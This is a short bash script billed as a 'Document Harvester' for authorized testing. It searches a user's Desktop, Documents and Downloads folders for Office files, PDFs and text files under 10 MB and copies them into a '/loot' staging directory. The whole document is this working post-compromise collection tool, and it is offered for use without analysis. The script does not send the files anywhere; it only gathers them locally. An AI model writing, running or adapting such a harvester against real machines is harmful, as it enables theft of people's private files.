#!/bin/bash
# Document Harvester - Collect Office docs and PDFs
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

echo "[+] Document Harvester"

# Target extensions
TARGETS="*.docx *.xlsx *.pptx *.pdf *.txt *.odt *.ods"
MAX_SIZE=10  # MB
DEST="/loot/documents"

mkdir -p $DEST

echo "[*] Collecting documents..."
for ext in $TARGETS; do
    find ~/Desktop ~/Documents ~/Downloads -name "$ext" -size -${MAX_SIZE}M -exec cp {} $DEST/ \; 2>/dev/null
done

COUNT=$(ls -1 $DEST 2>/dev/null | wc -l)
echo "[+] Collected $COUNT documents to $DEST"
